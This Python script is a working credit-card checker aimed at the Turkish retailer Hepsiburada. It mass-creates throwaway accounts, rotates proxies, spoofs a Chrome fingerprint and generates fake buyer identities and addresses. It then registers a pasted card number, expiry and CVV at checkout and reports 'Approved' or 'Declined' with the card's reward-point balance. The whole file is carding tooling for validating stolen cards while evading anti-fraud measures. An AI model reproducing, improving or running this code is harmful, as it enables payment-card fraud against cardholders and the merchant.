import re, sys, uuid, json, random, base64, time, secrets, hashlib
from curl_cffi import requests

FIRST_NAMES = ["Ahmet","Mehmet","Mustafa","Ali","Can","Burak","Emre","Murat","Serkan","Hakan",
               "Ayse","Fatma","Emine","Zeynep","Elif","Merve","Gamze","Buse","Irem","Seda"]
LAST_NAMES = ["Yilmaz","Kaya","Demir","Celik","Sahin","Yildiz","Yildirim","Ozturk","Aydin","Ozdemir",
              "Arslan","Dogan","Kilic","Aslan","Cetin","Kara","Koc","Kurt","Ozkan","Simsek"]
STREETS = ["Ataturk Cad. No:14 Daire:5","Inonu Mah. Gul Sok. No:8","Cumhuriyet Cad. Menekse Sok. No:21 D:3",
           "Barbaros Bulvari No:45 Kat:2","Bagdat Cad. Ihlamur Sok. No:12 D:4","Istiklal Cad. Lale Sok. No:7"]

ADDRESS_POOL = [
    {"cityCode": "06", "city": "Ankara", "townCode": "1130", "town": "ALTINDAĞ",
     "districtCode": "3157", "district": "ATIFBEY"},
]

PRODUCT = {
    "sku": "HBCV0000DB4HZC",
    "listingId": "3eefef74-d89c-4a1b-870f-3e19b93e0502",
    "imageUrl": "https://productimages.hepsiburada.net/s/777/{size}/110001076155585.jpg",
    "name": "PS06 MSI Prospect / AMD Ryzen 7 7800X3D / X870 / 256GB DDR5 5600Mhz Ram / RTX5090 32GB / 4TB Gen5 NVMe SSD / 360mm Sıvı Soğutma / AMD Gaming Paket",
}

TENANT_ID = "cc7c5241-6017-44b2-9528-93c8d8907efb"
CLIENT_ID = "47b14cfb-2cad-471a-85de-ebe4684ee95f"
IMPERSONATE = "chrome131"
MOBILE_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
APP_KEY = "D5BABFEB-AEE3-420B-9857-0697C8716A7E"
import os
from dotenv import load_dotenv

load_dotenv()

PROXIES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data", "proxies.txt")

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        except Exception:
            pass
    return []

def get_next_proxy():
    plist = load_proxies()
    if plist:
        return random.choice(plist)
    return None

def _proxies():
    p = get_next_proxy()
    return {"http": p, "https": p} if p else None

LOGIN_CACHE = {"data": None, "exp": 0}

def _rand_name():
    f = ["ahmet", "mehmet", "mustafa", "ali", "can", "burak", "emre", "murat"]
    l = ["yilmaz", "kaya", "demir", "celik", "sahin", "yildiz", "ozturk"]
    return random.choice(f) + random.choice(l) + str(random.randint(100, 9999))

def login_flow():
    email = _rand_name() + "@gmail.com"

    s = requests.Session(impersonate=IMPERSONATE, proxies=_proxies())
    s.headers.update({
        "User-Agent": MOBILE_UA,
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    })

    r = s.get("https://www.hepsiburada.com/", timeout=15)
    if r.status_code != 200:
        return None, "home_failed"

    r = s.get("https://oauth.hepsiburada.com/api/authenticate/xsrf-token", headers={
        "Origin": "https://giris.hepsiburada.com",
        "Referer": "https://giris.hepsiburada.com/",
    }, timeout=15)
    try:
        xd = r.json()
    except Exception:
        return None, "xsrf_parse_failed"
    xsrf_token = xd.get("xsrfToken") or xd.get("token") or ""
    if not xsrf_token:
        return None, "xsrf_failed"

    verifier = secrets.token_urlsafe(64)
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode("ascii")).digest()
    ).rstrip(b"=").decode("ascii")
    state = secrets.token_hex(16)

    return_url = (
        "https://oauth.hepsiburada.com/connect/authorize/callback?"
        "client_id=SPA&redirect_uri=https%3A%2F%2Fwww.hepsiburada.com%2Fuyelik%2Fcallback"
        "&response_type=code&scope=openid%20profile"
        f"&state={state}&code_challenge={challenge}&code_challenge_method=S256&response_mode=query"
    )

    r = s.post(
        "https://oauth.hepsiburada.com/api/authenticate/lazylogin",
        json={"username": email, "returnUrl": return_url,
              "continueUrl": "https://checkout.hepsiburada.com/odeme"},
        headers={
            "x-xsrf-token": xsrf_token,
            "fingerprint": secrets.token_hex(16),
            "app-key": APP_KEY,
            "Origin": "https://giris.hepsiburada.com",
            "Referer": "https://giris.hepsiburada.com/",
            "Content-Type": "application/json",
        },
        timeout=15,
    )
    try:
        ld = r.json()
    except Exception:
        return None, "login_parse_failed"
    user_id = (ld.get("data") or {}).get("id")
    if not user_id:
        return None, "login_failed"

    cb = s.get(
        "https://oauth.hepsiburada.com/connect/authorize/callback",
        params={
            "client_id": "SPA",
            "redirect_uri": "https://www.hepsiburada.com/uyelik/callback",
            "response_type": "code",
            "scope": "openid profile",
            "state": state,
            "code_challenge": challenge,
            "code_challenge_method": "S256",
            "response_mode": "query",
        },
        headers={"Referer": "https://giris.hepsiburada.com/"},
        allow_redirects=True,
        timeout=15,
    )

    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(cb.url).query)
    auth_code = (qs.get("code") or [None])[0]
    if not auth_code:
        return None, "no_code"

    s.post(
        "https://oauth.hepsiburada.com/connect/token",
        data={
            "grant_type": "authorization_code",
            "code": auth_code,
            "redirect_uri": "https://www.hepsiburada.com/uyelik/callback",
            "client_id": "SPA",
            "code_verifier": verifier,
        },
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.hepsiburada.com",
            "Referer": "https://www.hepsiburada.com/",
        },
        timeout=15,
    )

    s.get("https://www.hepsiburada.com/uyelik/callback",
          headers={"Referer": "https://giris.hepsiburada.com/"},
          allow_redirects=True, timeout=15)

    jwt = None
    user_info = None
    device = None
    anon = None
    for c in s.cookies.jar:
        if c.name == "jwt":
            jwt = c.value
        elif c.name == "userInfo":
            user_info = c.value
        elif c.name == "unique-device-id":
            device = c.value
        elif c.name == "hbus_anonymousId":
            anon = c.value

    if not jwt:
        return None, "no_jwt"

    exp = 0
    try:
        p = jwt.split(".")[1]
        p += "=" * (-len(p) % 4)
        exp = json.loads(base64.urlsafe_b64decode(p)).get("exp", 0)
    except Exception:
        pass

    return {
        "success": True,
        "user_id": user_id,
        "email": email,
        "jwt": jwt,
        "userInfo": user_info,
        "unique_device_id": device,
        "hbus_anonymousId": anon or user_id,
        "exp": exp,
        "ts": int(time.time()),
    }, None

def get_fresh_account():
    now = time.time()
    if LOGIN_CACHE["data"] and LOGIN_CACHE["exp"] > now + 600:
        return LOGIN_CACHE["data"]
    data, err = login_flow()
    if not data:
        raise RuntimeError(f"login_flow_failed: {err}")
    LOGIN_CACHE["data"] = data
    LOGIN_CACHE["exp"] = data["exp"] or (now + 3600)
    return data

ACTIVE_SESSION_DATA = {
    "session": None,
    "ident_uid": None,
    "raw_cookies": None,
    "jwt": None,
    "basket_id": None,
    "usage_count": 0,
    "created_at": 0
}

def parse_cc(raw):
    c = raw.strip()
    if c.lower().startswith("cc:"): c = c[3:].strip()
    c = c.strip("{}").strip()
    p = [x.strip() for x in re.split(r"[:|/]", c)]
    if len(p) != 4: raise ValueError("Format: cc: {kartno|ay|yıl|cvv}")
    return p[0].replace(" ", "").replace("-", ""), p[1].zfill(2), (p[2][2:] if len(p[2]) == 4 else p[2]), p[3]

def gen_identity():
    f = random.choice(FIRST_NAMES); l = random.choice(LAST_NAMES)
    return {"first_name": f, "last_name": l, "holder_name": f"{f} {l}",
            "email": f"{f.lower()}{l.lower()}{random.randint(100,9999)}@gmail.com",
            "phone": f"+90{random.choice(['530','532','535','536','542','544','552','554'])}{random.randint(1000000,9999999)}",
            "street": random.choice(STREETS), "address_name": random.choice(["Ev","İş","Yazlık","Ofis"])}

def sj(r):
    try: return r.json()
    except: return None

def nc(): return str(uuid.uuid4())

def gc(s, n):
    for c in s.cookies.jar:
        if c.name == n: return c.value
    return None

def find_session_cookie(s):
    for c in s.cookies.jar:
        if "session" in c.name.lower(): return c.value
    return None

def update_session_from(s, r=None):
    if r is not None:
        try:
            sc = r.headers.get("set-cookie") or ""
            m = re.search(r"hbus_sessionId=([^;,\s]+)", sc, re.I)
            if m:
                sid = m.group(1)
                try: s.cookies.set("hbus_sessionId", sid, domain=".hepsiburada.com")
                except: pass
                return sid
        except: pass
    return gc(s, "hbus_sessionId") or find_session_cookie(s)

def build_addr(profile):
    a = ADDRESS_POOL[0]
    return {**profile, **a}

def build_cookie_header(raw_cookies, extra_sid=None):
    norm = {k.lower(): v for k, v in (raw_cookies or {}).items()}
    parts = []
    for k in ["hbus_anonymousid", "jwt", "unique-device-id", "userinfo"]:
        v = norm.get(k)
        if v:
            display = {"hbus_anonymousid": "hbus_anonymousId", "jwt": "jwt",
                       "unique-device-id": "unique-device-id", "userinfo": "userInfo"}[k]
            parts.append(f"{display}={v}")
    parts.append("tenant=SPA")
    if extra_sid:
        sid_enc = extra_sid if "%7C" in extra_sid else extra_sid.replace("|", "%7C")
        parts.append(f"hbus_sessionId={sid_enc}")
    return "; ".join(parts)

def basket_headers(uid, cid, referer="https://www.hepsiburada.com/", extra=None):
    h = {
        "User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "hbus_anonymousid": uid, "anonymous-user-id": uid,
        "x-correlation-id": nc(), "withcredentials": "true",
        "location-of-customer": "undefined", "client-id": cid, "tenant-id": TENANT_ID,
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://www.hepsiburada.com", "referer": referer,
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
        "priority": "u=1, i",
    }
    if extra: h.update(extra)
    return h

def checkout_headers(uid, cid, referer, raw_cookies=None, at=None, extra=None):
    h = {
        "User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "hbus_anonymousid": uid, "anonymous-user-id": uid,
        "x-correlation-id": nc(), "hb_language": "tr",
        "client-id": cid, "tenant-id": TENANT_ID,
        "content-type": "application/json; charset=utf-8",
        "origin": "https://checkout.hepsiburada.com", "referer": referer,
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
        "priority": "u=1, i",
    }
    if raw_cookies: h["Cookie"] = build_cookie_header(raw_cookies)
    if at: h["authorization"] = f"Bearer {at}"
    if extra: h.update(extra)
    return h

def _addr_gw_headers(raw_cookies, jwt=None):
    h = {
        "User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "content-type": "application/json;charset=UTF-8", "sec-ch-ua-mobile": "?1",
        "origin": "https://checkout.hepsiburada.com",
        "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
        "referer": "https://checkout.hepsiburada.com/",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7", "priority": "u=1, i",
        "Cookie": build_cookie_header(raw_cookies),
    }
    if jwt: h["authorization"] = f"Bearer {jwt}"
    return h

def add_addr(s, pr, raw_cookies, jwt=None):
    p = {
        "addressType": 1, "billingType": 1,
        "setAlsoAsBillingAddress": True,
        "firstName": pr["first_name"], "lastName": pr["last_name"],
        "phoneNumber": pr["phone"], "locationType": 0,
        "locationDeliveryUnavailableDays": [],
        "cityCode": pr["cityCode"], "city": pr["city"],
        "town": pr["town"], "townCode": pr["townCode"],
        "district": pr["district"], "districtCode": pr["districtCode"],
        "address1": pr["street"], "addressName": pr["address_name"],
        "countryCode": "TUR", "country": "Türkiye",
        "version": "01", "checkTaxNumber": False,
    }
    r = s.post("https://customer-voltran-gw.hepsiburada.com/api/users/addresses",
               json=p, headers=_addr_gw_headers(raw_cookies, jwt))
    d = sj(r) or {}
    aid = (d.get("Data") or {}).get("Id")
    if aid and aid != "00000000-0000-0000-0000-000000000000":
        return aid
    return None

def get_basket_items(s, uid, cid):
    h = basket_headers(uid, cid, referer="https://www.hepsiburada.com/sepetim")
    r = s.get("https://checkout.hepsiburada.com/api/basket", headers=h)
    update_session_from(s, r)
    body = sj(r) or {}
    res = body.get("result") or {}
    basket = res.get("basket") or {}
    items = basket.get("basketItems") or []
    return items, body

def add_basket(s, uid, cid):
    items, _ = get_basket_items(s, uid, cid)
    for item in items:
        if item.get("product", {}).get("sku") == PRODUCT["sku"]:
            return True

    meta = {"sku": PRODUCT["sku"], "listingId": PRODUCT["listingId"],
            "imageUrl": PRODUCT["imageUrl"], "name": PRODUCT["name"]}
    p = {"product": {"metadata": meta, "quantity": 1, "origin": "SfProductDetail"}}

    h = basket_headers(uid, cid,
                       referer=f"https://www.hepsiburada.com/m/go-gamer-ps06-msi-prospect-p-{PRODUCT['sku']}?magaza=Go Gamer")
    r = s.put("https://checkout.hepsiburada.com/api/basket", json=p, headers=h)
    update_session_from(s, r)
    return r.status_code in (200, 201, 204)

def get_options(s, uid, cid, raw_cookies=None, at=None):
    h = checkout_headers(uid, cid, "https://checkout.hepsiburada.com/odeme",
                         raw_cookies=raw_cookies, at=at)
    url = "https://checkout.hepsiburada.com/api/v1/options-and-addresses"
    r = s.get(url, headers=h)
    update_session_from(s, r)
    return sj(r) or {}

def init_sardes(s, uid, cid, at=None, raw_cookies=None):
    h = checkout_headers(uid, cid, "https://checkout.hepsiburada.com/", raw_cookies=raw_cookies, at=at)
    r = s.get("https://sardes-electrum-api.hepsiburada.com/init", headers=h)
    update_session_from(s, r)
    return sj(r) or {}

def extract_card(init):
    cid = vp = None
    def walk(o, d=0):
        nonlocal cid, vp
        if d > 10: return
        if isinstance(o, dict):
            if not cid:
                v = o.get("cardId") or o.get("id")
                if v and isinstance(v, str) and len(v) > 20: cid = v
            if not vp:
                v = o.get("vposName")
                if v and isinstance(v, str) and len(v) > 2: vp = v
            for x in o.values(): walk(x, d+1)
        elif isinstance(o, list):
            for x in o: walk(x, d+1)
    walk(init)
    return cid, vp

def reg_card(s, uid, cid, at, bid, cn, em, ey, cv, hn, raw_cookies=None, save=True):
    h = checkout_headers(uid, cid, "https://checkout.hepsiburada.com/odeme",
                         raw_cookies=raw_cookies, at=at)
    p = {
        "cardNumber": cn, "expireMonth": em, "expireYear": ey, "cvv": cv, "holderName": hn,
        "saveCreditCard": save, "isTransferMyCardsToHepsipay": False,
        "cardTransferConsentUrl": "https://images.hepsipay.com/mobile/agreement/wallet/v04/3c1f2016-fe73-4a3f-930c-852b36370c33.html",
        "agreementUrl": "https://images.hepsiburada.net/sardes/assets/wallet/agreement/v03/agreement.html",
        "isOpc": False, "basketId": bid, "installment": 1,
    }
    r = s.put("https://checkout.hepsiburada.com/web/api/v1/checkout/option/newcard",
              json=p, headers=h)
    update_session_from(s, r)
    return sj(r) or {}, r.status_code

def get_points(s, uid, cid, at, card_id, vp, raw_cookies=None):
    h = checkout_headers(uid, cid, "https://checkout.hepsiburada.com/odeme",
                         raw_cookies=raw_cookies, at=at)
    h["use-existing-payment-points"] = "false"
    p = {"vposName": vp} if vp else {}
    # Hepsiburada checkout web api yeni puan endpoint'i
    r = s.get("https://checkout.hepsiburada.com/web/api/v1/checkout/credit-card/points",
              params=p, headers=h)
    update_session_from(s, r)
    # Geriye dönük uyumluluk için eğer 404 dönerse eski formatı da dene
    if r.status_code == 404 and card_id:
        r = s.get(f"https://checkout.hepsiburada.com/web/api/v1/checkout/credit-card/points/{card_id}",
                  params=p, headers=h)
        update_session_from(s, r)
    return r.text

def init_new_account():
    php = get_fresh_account()
    if not php.get("success") or not php.get("user_id") or not php.get("jwt"):
        raise RuntimeError("userid_invalid")

    uid, jwt = php["user_id"], php["jwt"]
    user_info = php.get("userInfo", "")
    device_id = php.get("unique_device_id", "")
    anon = php.get("hbus_anonymousId") or uid

    p = jwt.split(".")[1]; p += "=" * (-len(p) % 4)
    payload = json.loads(base64.urlsafe_b64decode(p))
    if payload.get("exp", 0) < time.time() + 300:
        raise RuntimeError("jwt_expired")
    ident_uid = payload.get("UserId") or uid

    s = requests.Session(impersonate=IMPERSONATE, proxies=_proxies())
    s.headers.update({"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"})

    s.cookies.set("hbus_anonymousId", anon, domain=".hepsiburada.com")
    s.cookies.set("jwt", jwt, domain=".hepsiburada.com")
    if user_info: s.cookies.set("userInfo", user_info, domain=".hepsiburada.com")
    if device_id: s.cookies.set("unique-device-id", device_id, domain=".hepsiburada.com")
    s.cookies.set("tenant", "SPA", domain=".hepsiburada.com")

    raw_cookies = {"hbus_anonymousId": anon, "jwt": jwt,
                   "unique-device-id": device_id, "userInfo": user_info}

    add_basket(s, ident_uid, CLIENT_ID)

    opt = get_options(s, ident_uid, CLIENT_ID, raw_cookies=raw_cookies, at=jwt)
    res = opt.get("result") or {}
    bid = res.get("basketId")
    ready = res.get("isReadyPaymentProcess")

    if not ready:
        profile = build_addr(gen_identity())
        add_addr(s, profile, raw_cookies, jwt)
        opt = get_options(s, ident_uid, CLIENT_ID, raw_cookies=raw_cookies, at=jwt)
        res = opt.get("result") or {}
        bid = res.get("basketId") or bid

    if not bid:
        raise RuntimeError("no_basketId")

    return {
        "session": s,
        "ident_uid": ident_uid,
        "raw_cookies": raw_cookies,
        "jwt": jwt,
        "basket_id": bid,
        "usage_count": 0,
        "created_at": time.time()
    }

def get_or_renew_session(force_new=False):
    global ACTIVE_SESSION_DATA
    expired = (time.time() - ACTIVE_SESSION_DATA.get("created_at", 0)) > 600
    if force_new or ACTIVE_SESSION_DATA["session"] is None or ACTIVE_SESSION_DATA["usage_count"] >= 10 or expired:
        ACTIVE_SESSION_DATA = init_new_account()

    ACTIVE_SESSION_DATA["usage_count"] += 1
    return ACTIVE_SESSION_DATA

def query_card_points(cn, em, ey, cv):
    try:
        profile = gen_identity()
        acc = get_or_renew_session()
        s = acc["session"]
        ident_uid = acc["ident_uid"]
        raw_cookies = acc["raw_cookies"]
        jwt = acc["jwt"]
        bid = acc["basket_id"]

        card_body, card_status = reg_card(s, ident_uid, CLIENT_ID, jwt, bid,
                                          cn, em, ey, cv, profile["holder_name"], raw_cookies)

        if card_status not in (200, 201, 204):
            LOGIN_CACHE["data"] = None; LOGIN_CACHE["exp"] = 0
            acc = get_or_renew_session(force_new=True)
            s, ident_uid, raw_cookies, jwt, bid = acc["session"], acc["ident_uid"], acc["raw_cookies"], acc["jwt"], acc["basket_id"]
            card_body, card_status = reg_card(s, ident_uid, CLIENT_ID, jwt, bid,
                                              cn, em, ey, cv, profile["holder_name"], raw_cookies)
            if card_status not in (200, 201, 204):
                return "Declined! - 0.0 TRY!"

        init = init_sardes(s, ident_uid, CLIENT_ID, at=jwt, raw_cookies=raw_cookies)
        card_id, vp = extract_card(init)
        if not card_id:
            return "Declined! - 0.0 TRY!"

        raw = get_points(s, ident_uid, CLIENT_ID, jwt, card_id, vp, raw_cookies=raw_cookies)

        try:
            points = (json.loads(raw).get("result") or {}).get("points") or []
        except Exception:
            return "Declined! - 0.0 TRY!"

        if not points:
            return "Declined! - 0.0 TRY!"

        p = points[0]
        return f"Approved! - {p.get('amount', 0)} {p.get('name', '')}"
    except Exception as exc:
        err = str(exc).lower()
        if "proxy" in err or "tunnel" in err or "socks" in err:
            return "⚠️ Proxy Hatası (Bağlantı Kurulamadı)"
        elif "timeout" in err or "timed out" in err:
            return "⚠️ Site Hatası (Zaman Aşımı)"
        elif any(k in err for k in ["login", "basket", "connect", "connection", "requests", "http"]):
            return "⚠️ Site Hatası (İstek Başarısız)"
        else:
                                  
            cleaned = str(exc)
            cleaned = re.sub(r'https?://[^:@\s]+:[^@\s]+@[^\s/:]+(?::\d+)?', '[PROXY]', cleaned)
            cleaned = re.sub(r'https?://[^\s<>"\')]+', '[SANSÜRLENDİ]', cleaned)
            cleaned = re.sub(r'(?i)\b(?:[\w\-]+\.)*(?:hepsiburada|hepsipay|voltran-gw|sardes)[\w\.\-]*\b', '[SANSÜRLENDİ]', cleaned)
            cleaned = re.sub(r'(?i)\b(?:[\w\-]+\.)+(?:com|net|org|com\.tr|tr)\b', '[SANSÜRLENDİ]', cleaned)
            cleaned = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?\b', '[IP]', cleaned)
            return f"⚠️ Hata: {cleaned}"

def main():
    try: raw = input("cc: ")
    except: sys.exit(0)
    if not raw: sys.exit(1)
    try: cn, em, ey, cv = parse_cc(raw)
    except Exception as e: print(f"Hata: {e}"); sys.exit(1)

    res = query_card_points(cn, em, ey, cv)
    print(res)

if __name__ == "__main__":
    main()
